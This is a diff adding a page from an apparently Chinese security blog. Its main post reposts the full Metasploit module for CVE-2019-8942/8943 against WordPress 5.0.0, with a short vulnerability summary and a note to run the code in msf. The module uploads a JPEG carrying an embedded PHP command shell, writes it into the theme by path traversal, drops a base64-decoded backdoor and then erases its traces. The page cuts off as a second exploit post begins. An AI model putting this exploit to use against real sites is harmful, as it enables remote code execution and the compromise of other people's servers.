@@ -1,0 +1,1173 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/22/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/（CVE-2019-8943）WordPress 5.0.3 - Crop-image Shell Upload (Metasploit)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-8943%EF%BC%89WordPress%205.0.3%20-%20Crop-image%20Shell%20Upload%20(Metasploit)/" class="article-date">
+  <time datetime="2022-07-08T06:26:07.705Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-8943）WordPress-5-0-0-Crop-image-Shell-Upload-Metasploit"><a href="#（CVE-2019-8943）WordPress-5-0-0-Crop-image-Shell-Upload-Metasploit" class="headerlink" title="（CVE-2019-8943）WordPress 5.0.0 - Crop-image Shell Upload (Metasploit)"></a>（CVE-2019-8943）WordPress 5.0.0 - Crop-image Shell Upload (Metasploit)</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>WordPress通过5.0.3允许在wp_crop_image（）中进行路径遍历。攻击者（具有裁剪图像的特权）可以通过包含两个图像扩展名和../序列的文件名，例如以.jpg？/../../结尾的文件名，将输出图像写入任意目录。<br>file.jpg子字符串。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>保存内容为xxx.md 并放到msf运行的目录下</p>
+<pre><code>##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule &lt; Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FileDropper
+  include Msf::Exploit::Remote::HTTP::Wordpress
+
+  def initialize(info = &#123;&#125;)
+    super(update_info(
+      info,
+      &#39;Name&#39;            =&gt; &#39;WordPress Crop-image Shell Upload&#39;,
+      &#39;Description&#39;     =&gt; %q&#123;
+          This module exploits a path traversal and a local file inclusion
+          vulnerability on WordPress versions 5.0.0 and &lt;= 4.9.8.
+          The crop-image function allows a user, with at least author privileges,
+          to resize an image and perform a path traversal by changing the _wp_attached_file
+          reference during the upload. The second part of the exploit will include
+          this image in the current theme by changing the _wp_page_template attribute
+          when creating a post.
+
+          This exploit module only works for Unix-based systems currently.
+      &#125;,
+      &#39;License&#39;         =&gt; MSF_LICENSE,
+      &#39;Author&#39;          =&gt;
+      [
+        &#39;RIPSTECH Technology&#39;,                               # Discovery
+        &#39;Wilfried Becard &lt;wilfried.becard@synacktiv.com&gt;&#39;    # Metasploit module
+      ],
+    &#39;References&#39;      =&gt;
+      [
+        [ &#39;CVE&#39;, &#39;2019-8942&#39; ],
+        [ &#39;CVE&#39;, &#39;2019-8943&#39; ],
+        [ &#39;URL&#39;, &#39;https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/&#39;]
+      ],
+      &#39;DisclosureDate&#39;  =&gt; &#39;Feb 19 2019&#39;,
+      &#39;Platform&#39;        =&gt; &#39;php&#39;,
+      &#39;Arch&#39;            =&gt; ARCH_PHP,
+      &#39;Targets&#39;         =&gt; [[&#39;WordPress&#39;, &#123;&#125;]],
+      &#39;DefaultTarget&#39;   =&gt; 0
+    ))
+
+    register_options(
+      [
+        OptString.new(&#39;USERNAME&#39;, [true, &#39;The WordPress username to authenticate with&#39;]),
+        OptString.new(&#39;PASSWORD&#39;, [true, &#39;The WordPress password to authenticate with&#39;])
+      ])
+  end
+
+  def check
+    cookie = wordpress_login(username, password)
+    if cookie.nil?
+      store_valid_credential(user: username, private: password, proof: cookie)
+      return CheckCode::Safe
+    end
+
+    CheckCode::Appears
+  end
+
+  def username
+    datastore[&#39;USERNAME&#39;]
+  end
+
+  def password
+    datastore[&#39;PASSWORD&#39;]
+  end
+
+  def get_wpnonce(cookie)
+    uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;media-new.php&#39;)
+    res = send_request_cgi(
+      &#39;method&#39;    =&gt; &#39;GET&#39;,
+      &#39;uri&#39;       =&gt; uri,
+      &#39;cookie&#39; =&gt; cookie
+    )
+    if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?
+      res.get_hidden_inputs.first[&quot;_wpnonce&quot;]
+    end
+  end
+
+  def get_wpnonce2(image_id, cookie)
+    uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;post.php&#39;)
+    res = send_request_cgi(
+      &#39;method&#39;    =&gt; &#39;GET&#39;,
+      &#39;uri&#39;       =&gt; uri,
+      &#39;cookie&#39;    =&gt; cookie,
+      &#39;vars_get&#39;  =&gt; &#123;
+        &#39;post&#39;   =&gt; image_id,
+        &#39;action&#39; =&gt; &quot;edit&quot;
+      &#125;
+    )
+    if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?
+      tmp = res.get_hidden_inputs
+      wpnonce2 = tmp[1].first[1]
+    end
+  end
+
+  def get_current_theme
+    uri = normalize_uri(datastore[&#39;TARGETURI&#39;])
+    res = send_request_cgi!(
+      &#39;method&#39;    =&gt; &#39;GET&#39;,
+      &#39;uri&#39;       =&gt; uri
+    )
+    fail_with(Failure::NotFound, &#39;Failed to access Wordpress page to retrieve theme.&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?
+
+    theme = res.body.scan(/\/wp-content\/themes\/(\w+)\//).flatten.first
+    fail_with(Failure::NotFound, &#39;Failed to retrieve theme&#39;) unless theme
+
+    theme
+  end
+
+  def get_ajaxnonce(cookie)
+    uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;admin-ajax.php&#39;)
+    res = send_request_cgi(
+      &#39;method&#39;    =&gt; &#39;POST&#39;,
+      &#39;uri&#39;       =&gt; uri,
+      &#39;cookie&#39; =&gt; cookie,
+      &#39;vars_post&#39;  =&gt; &#123;
+        &#39;action&#39; =&gt; &#39;query-attachments&#39;,
+        &#39;post_id&#39; =&gt; &#39;0&#39;,
+        &#39;query[item]&#39; =&gt; &#39;43&#39;,
+        &#39;query[orderby]&#39; =&gt; &#39;date&#39;,
+        &#39;query[order]&#39; =&gt; &#39;DESC&#39;,
+        &#39;query[posts_per_page]&#39; =&gt; &#39;40&#39;,
+        &#39;query[paged]&#39; =&gt; &#39;1&#39;
+      &#125;
+    )
+    fail_with(Failure::NotFound, &#39;Unable to reach page to retrieve the ajax nonce&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?
+    a_nonce = res.body.scan(/&quot;edit&quot;:&quot;(\w+)&quot;/).flatten.first
+    fail_with(Failure::NotFound, &#39;Unable to retrieve the ajax nonce&#39;) unless a_nonce
+
+    a_nonce
+  end
+
+  def upload_file(img_name, wp_nonce, cookie)
+    img_data = %w[
+      FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60 00 00 FF ED 00 38 50 68 6F
+      74 6F 73 68 6F 70 20 33 2E 30 00 38 42 49 4D 04 04 00 00 00 00 00 1C 1C 02 74 00
+      10 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B 3F 3E 1C 02 00 00 02 00 04 FF FE 00
+      3B 43 52 45 41 54 4F 52 3A 20 67 64 2D 6A 70 65 67 20 76 31 2E 30 20 28 75 73 69
+      6E 67 20 49 4A 47 20 4A 50 45 47 20 76 38 30 29 2C 20 71 75 61 6C 69 74 79 20 3D
+      20 38 32 0A FF DB 00 43 00 06 04 04 05 04 04 06 05 05 05 06 06 06 07 09 0E 09 09
+      08 08 09 12 0D 0D 0A 0E 15 12 16 16 15 12 14 14 17 1A 21 1C 17 18 1F 19 14 14 1D
+      27 1D 1F 22 23 25 25 25 16 1C 29 2C 28 24 2B 21 24 25 24 FF DB 00 43 01 06 06 06
+      09 08 09 11 09 09 11 24 18 14 18 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24
+      24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24
+      24 24 24 24 24 24 24 FF C0 00 11 08 00 C0 01 06 03 01 22 00 02 11 01 03 11 01 FF
+      C4 00 1F 00 00 01 05 01 01 01 01 01 01 00 00 00 00 00 00 00 00 01 02 03 04 05 06
+      07 08 09 0A 0B FF C4 00 B5 10 00 02 01 03 03 02 04 03 05 05 04 04 00 00 01 7D 01
+      02 03 00 04 11 05 12 21 31 41 06 13 51 61 07 22 71 14 32 81 91 A1 08 23 42 B1 C1
+      15 52 D1 F0 24 33 62 72 82 09 0A 16 17 18 19 1A 25 26 27 28 29 2A 34 35 36 37 38
+      39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A 73
+      74 75 76 77 78 79 7A 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4
+      A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4
+      D5 D6 D7 D8 D9 DA E1 E2 E3 E4 E5 E6 E7 E8 E9 EA F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FF
+      C4 00 1F 01 00 03 01 01 01 01 01 01 01 01 01 00 00 00 00 00 00 01 02 03 04 05 06
+      07 08 09 0A 0B FF C4 00 B5 11 00 02 01 02 04 04 03 04 07 05 04 04 00 01 02 77 00
+      01 02 03 11 04 05 21 31 06 12 41 51 07 61 71 13 22 32 81 08 14 42 91 A1 B1 C1 09
+      23 33 52 F0 15 62 72 D1 0A 16 24 34 E1 25 F1 17 18 19 1A 26 27 28 29 2A 35 36 37
+      38 39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A
+      73 74 75 76 77 78 79 7A 82 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2
+      A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2
+      D3 D4 D5 D6 D7 D8 D9 DA E2 E3 E4 E5 E6 E7 E8 E9 EA F2 F3 F4 F5 F6 F7 F8 F9 FA FF
+      DA 00 0C 03 01 00 02 11 03 11 00 3F 00 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B
+      3F 3E
+    ]
+    img_data = [img_data.join].pack(&#39;H*&#39;)
+    img_name += &#39;.jpg&#39;
+
+    boundary = &quot;#&#123;rand_text_alphanumeric(rand(10) + 5)&#125;&quot;
+    post_data = &quot;--#&#123;boundary&#125;\r\n&quot;
+    post_data &lt;&lt; &quot;Content-Disposition: form-data; name=\&quot;name\&quot;\r\n&quot;
+    post_data &lt;&lt; &quot;\r\n#&#123;img_name&#125;\r\n&quot;
+    post_data &lt;&lt; &quot;--#&#123;boundary&#125;\r\n&quot;
+    post_data &lt;&lt; &quot;Content-Disposition: form-data; name=\&quot;action\&quot;\r\n&quot;
+    post_data &lt;&lt; &quot;\r\nupload-attachment\r\n&quot;
+    post_data &lt;&lt; &quot;--#&#123;boundary&#125;\r\n&quot;
+    post_data &lt;&lt; &quot;Content-Disposition: form-data; name=\&quot;_wpnonce\&quot;\r\n&quot;
+    post_data &lt;&lt; &quot;\r\n#&#123;wp_nonce&#125;\r\n&quot;
+    post_data &lt;&lt; &quot;--#&#123;boundary&#125;\r\n&quot;
+    post_data &lt;&lt; &quot;Content-Disposition: form-data; name=\&quot;async-upload\&quot;; filename=\&quot;#&#123;img_name&#125;\&quot;\r\n&quot;
+    post_data &lt;&lt; &quot;Content-Type: image/jpeg\r\n&quot;
+    post_data &lt;&lt; &quot;\r\n#&#123;img_data&#125;\r\n&quot;
+    post_data &lt;&lt; &quot;--#&#123;boundary&#125;--\r\n&quot;
+    print_status(&quot;Uploading payload&quot;)
+    upload_uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;async-upload.php&#39;)
+
+    res = send_request_cgi(
+      &#39;method&#39;   =&gt; &#39;POST&#39;,
+      &#39;uri&#39;      =&gt; upload_uri,
+      &#39;ctype&#39;    =&gt; &quot;multipart/form-data; boundary=#&#123;boundary&#125;&quot;,
+      &#39;data&#39;     =&gt; post_data,
+      &#39;cookie&#39;   =&gt; cookie
+    )
+    fail_with(Failure::UnexpectedReply, &#39;Unable to upload image&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?
+    print_good(&quot;Image uploaded&quot;)
+    res = JSON.parse(res.body)
+    image_id = res[&quot;data&quot;][&quot;id&quot;]
+    update_nonce = res[&quot;data&quot;][&quot;nonces&quot;][&quot;update&quot;]
+    filename = res[&quot;data&quot;][&quot;filename&quot;]
+    return filename, image_id, update_nonce
+  end
+
+  def image_editor(img_name, ajax_nonce, image_id, cookie)
+    uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;admin-ajax.php&#39;)
+    res = send_request_cgi(
+      &#39;method&#39;    =&gt; &#39;POST&#39;,
+      &#39;uri&#39;       =&gt; uri,
+      &#39;cookie&#39; =&gt; cookie,
+      &#39;vars_post&#39;  =&gt; &#123;
+        &#39;action&#39; =&gt; &#39;image-editor&#39;,
+        &#39;_ajax_nonce&#39; =&gt; ajax_nonce,
+        &#39;postid&#39; =&gt; image_id,
+        &#39;history&#39; =&gt; &#39;[&#123;&quot;c&quot;:&#123;&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:400,&quot;h&quot;:300&#125;&#125;]&#39;,
+        &#39;target&#39; =&gt; &#39;all&#39;,
+        &#39;context&#39; =&gt; &#39;&#39;,
+        &#39;do&#39; =&gt; &#39;save&#39;
+      &#125;
+    )
+    fail_with(Failure::NotFound, &#39;Unable to access page to retrieve filename&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?
+    filename = res.body.scan(/(#&#123;img_name&#125;-\S+)-/).flatten.first
+    fail_with(Failure::NotFound, &#39;Unable to retrieve file name&#39;) unless filename
+
+    filename &lt;&lt; &#39;.jpg&#39;
+  end
+
+  def change_path(wpnonce2, image_id, filename, current_date, path, cookie)
+    uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;post.php&#39;)
+    res = send_request_cgi(
+      &#39;method&#39;   =&gt; &#39;POST&#39;,
+      &#39;uri&#39;      =&gt; uri,
+      &#39;cookie&#39; =&gt; cookie,
+      &#39;vars_post&#39;  =&gt; &#123;
+        &#39;_wpnonce&#39; =&gt; wpnonce2,
+        &#39;action&#39; =&gt; &#39;editpost&#39;,
+        &#39;post_ID&#39; =&gt; image_id,
+        &#39;meta_input[_wp_attached_file]&#39; =&gt; &quot;#&#123;current_date&#125;#&#123;filename&#125;#&#123;path&#125;&quot;
+      &#125;
+    )
+  end
+
+  def crop_image(image_id, ajax_nonce, cookie)
+    uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;admin-ajax.php&#39;)
+    res = send_request_cgi(
+      &#39;method&#39;   =&gt; &#39;POST&#39;,
+      &#39;uri&#39;      =&gt; uri,
+      &#39;cookie&#39; =&gt; cookie,
+      &#39;vars_post&#39;  =&gt; &#123;
+        &#39;action&#39; =&gt; &#39;crop-image&#39;,
+        &#39;_ajax_nonce&#39; =&gt; ajax_nonce,
+        &#39;id&#39; =&gt; image_id,
+        &#39;cropDetails[x1]&#39; =&gt; 0,
+        &#39;cropDetails[y1]&#39; =&gt; 0,
+        &#39;cropDetails[width]&#39; =&gt; 400,
+        &#39;cropDetails[height]&#39; =&gt; 300,
+        &#39;cropDetails[dst_width]&#39; =&gt; 400,
+        &#39;cropDetails[dst_height]&#39; =&gt; 300
+      &#125;
+    )
+  end
+
+  def include_theme(shell_name, cookie)
+    uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;post-new.php&#39;)
+    res = send_request_cgi(
+      &#39;method&#39;   =&gt; &#39;POST&#39;,
+      &#39;uri&#39;      =&gt; uri,
+      &#39;cookie&#39; =&gt; cookie
+    )
+    if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?
+      wpnonce2 = res.body.scan(/name=&quot;_wpnonce&quot; value=&quot;(\w+)&quot;/).flatten.first
+      post_id = res.body.scan(/&quot;post&quot;:&#123;&quot;id&quot;:(\w+),/).flatten.first
+      fail_with(Failure::NotFound, &#39;Unable to retrieve the second wpnonce and the post id&#39;) unless wpnonce2 &amp;&amp; post_id
+
+      post_title = Rex::Text.rand_text_alpha(10)
+      uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;post.php&#39;)
+      res = send_request_cgi(
+        &#39;method&#39;   =&gt; &#39;POST&#39;,
+        &#39;uri&#39;      =&gt; uri,
+        &#39;cookie&#39; =&gt; cookie,
+        &#39;vars_post&#39;  =&gt; &#123;
+          &#39;_wpnonce&#39;=&gt; wpnonce2,
+          &#39;action&#39; =&gt; &#39;editpost&#39;,
+          &#39;post_ID&#39; =&gt; post_id,
+          &#39;post_title&#39; =&gt; post_title,
+          &#39;post_name&#39; =&gt; post_title,
+          &#39;meta_input[_wp_page_template]&#39; =&gt; &quot;cropped-#&#123;shell_name&#125;.jpg&quot;
+        &#125;
+      )
+      fail_with(Failure::NotFound, &#39;Failed to retrieve post id&#39;) unless res &amp;&amp; res.code == 302
+      post_id
+    end
+  end
+
+  def check_for_base64(cookie, post_id)
+    uri = normalize_uri(datastore[&#39;TARGETURI&#39;])
+    # Test if base64 is on target
+    test_string = &#39;YmFzZTY0c3BvdHRlZAo=&#39;
+    res = send_request_cgi!(
+      &#39;method&#39;   =&gt; &#39;GET&#39;,
+      &#39;uri&#39;      =&gt; uri,
+      &#39;cookie&#39; =&gt; cookie,
+      &#39;vars_get&#39; =&gt; &#123;
+        &#39;p&#39; =&gt; post_id,
+        &#39;0&#39; =&gt; &quot;echo #&#123;test_string&#125; | base64 -d&quot;
+      &#125;
+    )
+    fail_with(Failure::NotFound, &#39;Unable to retrieve response to base64 command&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; !res.body.empty?
+
+    fail_with(Failure::NotFound, &quot;Can&#39;t find base64 decode on target&quot;) unless res.body.include?(&quot;base64spotted&quot;)
+    # Execute payload with base64 decode
+    @backdoor = Rex::Text.rand_text_alpha(10)
+    encoded = Rex::Text.encode_base64(payload.encoded)
+    res = send_request_cgi!(
+      &#39;method&#39;   =&gt; &#39;GET&#39;,
+      &#39;uri&#39;      =&gt; uri,
+      &#39;cookie&#39; =&gt; cookie,
+      &#39;vars_get&#39; =&gt; &#123;
+        &#39;p&#39; =&gt; post_id,
+        &#39;0&#39; =&gt; &quot;echo #&#123;encoded&#125; | base64 -d &gt; #&#123;@backdoor&#125;.php&quot;
+      &#125;
+    )
+
+    fail_with(Failure::NotFound, &#39;Failed to send payload to target&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; !res.body.empty?
+    send_request_cgi(
+      &#39;method&#39;  =&gt;  &#39;GET&#39;,
+      &#39;uri&#39;     =&gt;  normalize_uri(datastore[&#39;TARGETURI&#39;], &quot;#&#123;@backdoor&#125;.php&quot;),
+      &#39;cookie&#39;  =&gt;  cookie
+    )
+  end
+
+  def wp_cleanup(shell_name, post_id, cookie)
+    print_status(&#39;Attempting to clean up files...&#39;)
+    uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;admin-ajax.php&#39;)
+    res = send_request_cgi(
+      &#39;method&#39;    =&gt; &#39;POST&#39;,
+      &#39;uri&#39;       =&gt; uri,
+      &#39;cookie&#39;    =&gt; cookie,
+      &#39;vars_post&#39;  =&gt; &#123; &#39;action&#39; =&gt; &quot;query-attachments&quot; &#125;
+    )
+
+    fail_with(Failure::NotFound, &#39;Failed to receive a response for uploaded file&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; !res.body.empty?
+    infos = res.body.scan(/id&quot;:(\d+),.*filename&quot;:&quot;cropped-#&#123;shell_name&#125;&quot;.*?&quot;delete&quot;:&quot;(\w+)&quot;.*&quot;id&quot;:(\d+),.*filename&quot;:&quot;cropped-x&quot;.*?&quot;delete&quot;:&quot;(\w+)&quot;.*&quot;id&quot;:(\d+),.*filename&quot;:&quot;#&#123;shell_name&#125;&quot;.*?&quot;delete&quot;:&quot;(\w+)&quot;/).flatten
+    id1, id2, id3 = infos[0], infos[2], infos[4]
+    delete_nonce1, delete_nonce2, delete_nonce3 = infos[1], infos[3], infos[5]
+    for i in (0...6).step(2)
+      res = send_request_cgi(
+        &#39;method&#39;    =&gt; &#39;POST&#39;,
+        &#39;uri&#39;       =&gt; uri,
+        &#39;cookie&#39;    =&gt; cookie,
+        &#39;vars_post&#39;  =&gt; &#123;
+            &#39;action&#39; =&gt; &quot;delete-post&quot;,
+            &#39;id&#39;     =&gt; infos[i],
+            &#39;_wpnonce&#39; =&gt; infos[i+1]
+        &#125;
+      )
+    end
+
+    uri1 = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;edit.php&#39;)
+    res = send_request_cgi(
+      &#39;method&#39;    =&gt; &#39;GET&#39;,
+      &#39;uri&#39;       =&gt; uri1,
+      &#39;cookie&#39;    =&gt; cookie
+    )
+
+    if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?
+      post_nonce = res.body.scan(/post=#&#123;post_id&#125;&amp;action=trash&amp;_wpnonce=(\w+)/).flatten.first
+      fail_with(Failure::NotFound, &#39;Unable to retrieve post nonce&#39;) unless post_nonce
+      uri2 = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;post.php&#39;)
+
+      res = send_request_cgi(
+        &#39;method&#39;    =&gt; &#39;GET&#39;,
+        &#39;uri&#39;       =&gt; uri2,
+        &#39;cookie&#39;    =&gt; cookie,
+        &#39;vars_get&#39;  =&gt; &#123;
+          &#39;post&#39;     =&gt; post_id,
+          &#39;action&#39;   =&gt; &#39;trash&#39;,
+          &#39;_wpnonce&#39; =&gt; post_nonce
+        &#125;
+      )
+
+      fail_with(Failure::NotFound, &#39;Unable to retrieve response&#39;) unless res &amp;&amp; res.code == 302
+      res = send_request_cgi(
+        &#39;method&#39;    =&gt; &#39;GET&#39;,
+        &#39;uri&#39;       =&gt; uri1,
+        &#39;cookie&#39;    =&gt; cookie,
+        &#39;vars_get&#39;  =&gt; &#123;
+          &#39;post_status&#39; =&gt; &quot;trash&quot;,
+          &#39;post_type&#39;   =&gt; &#39;post&#39;,
+          &#39;_wpnonce&#39; =&gt; post_nonce
+        &#125;
+      )
+
+      if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?
+        nonce = res.body.scan(/post=#&#123;post_id&#125;&amp;action=delete&amp;_wpnonce=(\w+)/).flatten.first
+        fail_with(Failure::NotFound, &#39;Unable to retrieve nonce&#39;) unless nonce
+
+        send_request_cgi(
+          &#39;method&#39;    =&gt; &#39;GET&#39;,
+          &#39;uri&#39;       =&gt; uri2,
+          &#39;cookie&#39;    =&gt; cookie,
+          &#39;vars_get&#39;  =&gt; &#123;
+            &#39;post&#39;     =&gt; post_id,
+            &#39;action&#39;   =&gt; &#39;delete&#39;,
+            &#39;_wpnonce&#39; =&gt; nonce
+          &#125;
+        )
+      end
+    end
+  end
+
+  def exploit
+    fail_with(Failure::NotFound, &#39;The target does not appear to be using WordPress&#39;) unless wordpress_and_online?
+
+    print_status(&quot;Authenticating with WordPress using #&#123;username&#125;:#&#123;password&#125;...&quot;)
+    cookie = wordpress_login(username, password)
+    fail_with(Failure::NoAccess, &#39;Failed to authenticate with WordPress&#39;) if cookie.nil?
+    print_good(&quot;Authenticated with WordPress&quot;)
+    store_valid_credential(user: username, private: password, proof: cookie)
+
+    print_status(&quot;Preparing payload...&quot;)
+    @current_theme = get_current_theme
+    wp_nonce = get_wpnonce(cookie)
+    @current_date = Time.now.strftime(&quot;%Y/%m/&quot;)
+
+    img_name = Rex::Text.rand_text_alpha(10)
+    @filename1, image_id, update_nonce = upload_file(img_name, wp_nonce, cookie)
+    ajax_nonce = get_ajaxnonce(cookie)
+
+    @filename1 = image_editor(img_name, ajax_nonce, image_id, cookie)
+    wpnonce2 = get_wpnonce2(image_id, cookie)
+
+    change_path(wpnonce2, image_id, @filename1, @current_date, &#39;?/x&#39;, cookie)
+    crop_image(image_id, ajax_nonce, cookie)
+
+    @shell_name = Rex::Text.rand_text_alpha(10)
+    change_path(wpnonce2, image_id, @filename1, @current_date, &quot;?/../../../../themes/#&#123;@current_theme&#125;/#&#123;@shell_name&#125;&quot;, cookie)
+    crop_image(image_id, ajax_nonce, cookie)
+
+    print_status(&quot;Including into theme&quot;)
+    post_id = include_theme(@shell_name, cookie)
+
+    check_for_base64(cookie, post_id)
+    wp_cleanup(@shell_name, post_id, cookie)
+  end
+
+  def on_new_session(client)
+    client.shell_command_token(&quot;rm wp-content/uploads/#&#123;@current_date&#125;#&#123;@filename1[0...10]&#125;*&quot;)
+    client.shell_command_token(&quot;rm wp-content/uploads/#&#123;@current_date&#125;cropped-#&#123;@filename1[0...10]&#125;*&quot;)
+    client.shell_command_token(&quot;rm -r wp-content/uploads/#&#123;@current_date&#125;#&#123;@filename1[0...10]&#125;*&quot;)
+    client.shell_command_token(&quot;rm wp-content/themes/#&#123;@current_theme&#125;/cropped-#&#123;@shell_name&#125;.jpg&quot;)
+    client.shell_command_token(&quot;rm #&#123;@backdoor&#125;.php&quot;)
+  end
+en
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-8943%EF%BC%89WordPress%205.0.3%20-%20Crop-image%20Shell%20Upload%20(Metasploit)/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-8943%EF%BC%89WordPress%205.0.3%20-%20Crop-image%20Shell%20Upload%20(Metasploit)/" data-id="cl5c2qyhy00mfy8v1gt92a3og" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Wordpress/Wordpress 系统漏洞/（CVE-2019-6977）WordPress 5.0 rce" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
